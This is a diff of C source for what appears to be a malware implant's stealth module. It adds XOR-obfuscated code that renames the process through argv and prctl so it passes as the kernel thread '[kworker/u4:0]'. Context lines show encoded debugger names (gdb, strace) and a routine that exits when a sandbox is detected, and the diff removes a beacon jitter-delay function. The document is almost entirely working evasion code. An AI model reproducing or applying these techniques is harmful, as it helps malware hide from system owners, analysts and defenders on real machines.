@@ -1,7 +1,7 @@
-
 #include "stealth.h"
 #include "utils.h"
 #include "monocypher.h"
+#include "phantom.h"
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -13,6 +13,44 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
+
+// XOR-encoded "[kworker/u4:0]" (Key: 0xAB)
+static const uint8_t OBF_KWORKER[] = {
+    0xF0, 0xC0, 0xDC, 0xC4, 0xD9, 0xC0, 0xCE, 0xD9, 0x84, 0xDE, 0x9F, 0x91, 0x9B, 0xF6, 0x00
+};
+
+void decode_kworker(char *dst, size_t dst_size) {
+    size_t i;
+    if (!dst || dst_size == 0) return;
+    for (i = 0; i < dst_size; i++) dst[i] = '\0';
+    for (i = 0; OBF_KWORKER[i] != 0x00 && i < dst_size - 1; i++) {
+        dst[i] = OBF_KWORKER[i] ^ 0xAB;
+    }
+}
+
+void masquerade_argv(char **argv, const char *name) {
+    if (!argv || !argv[0] || !name) return;
+    size_t len = strlen(argv[0]);
+    size_t name_len = strlen(name);
+    memset(argv[0], 0, len);
+    if (name_len >= len) {
+        memcpy(argv[0], name, len - 1);
+        argv[0][len - 1] = '\0';
+    } else {
+        memcpy(argv[0], name, name_len);
+        argv[0][name_len] = '\0';
+    }
+}
+
+void prctl_rename(const char *name) {
+    if (!name) return;
+    char short_name[16];
+    size_t len = strlen(name);
+    if (len >= 16) len = 15;
+    memcpy(short_name, name, len);
+    short_name[len] = '\0';
+    prctl(PR_SET_NAME, (unsigned long)short_name, 0, 0, 0);
+}
 
 static const uint8_t OBF_GDB[] = {0xCC, 0xCF, 0xC9};
 static const uint8_t OBF_STRACE[] = {0xD8, 0xDF, 0xD9, 0xCA, 0xC8, 0xCE};
@@ -997,52 +1035,7 @@ int ph_stealth_self_terminate_if_sandbox(void)
     if (detection_result != PH_STEALTH_OK) {
 
         ph_wipe_memory(&detection_result, sizeof(detection_result));
-
         _exit(0);
     }
-
     return PH_OK;
-}
-
-int ph_stealth_get_jitter_delay(int base_delay_ms)
-{
-    if (base_delay_ms <= 0) {
-        return base_delay_ms;
-    }
-
-    int jitter_range = (base_delay_ms * 30) / 100;
-
-    int fd = open("/dev/urandom", O_RDONLY);
-    int32_t random_value = 0;
-
-    if (fd >= 0) {
-        ssize_t bytes_read = read(fd, &random_value, sizeof(random_value));
-        close(fd);
-
-        if (bytes_read != sizeof(random_value)) {
-
-            struct timespec ts;
-            clock_gettime(CLOCK_MONOTONIC, &ts);
-            random_value = (int32_t)(ts.tv_nsec ^ ts.tv_sec);
-        }
-    } else {
-
-        struct timespec ts;
-        clock_gettime(CLOCK_MONOTONIC, &ts);
-        random_value = (int32_t)(ts.tv_nsec ^ ts.tv_sec);
-    }
-
-    if (random_value < 0) {
-        random_value = -random_value;
-    }
-
-    int jitter_offset = (random_value % (jitter_range * 2 + 1)) - jitter_range;
-
-    int _delay = base_delay_ms + jitter_offset;
-
-    if (_delay < 100) {
-        _delay = 100;
-    }
-
-    return _delay;
 }
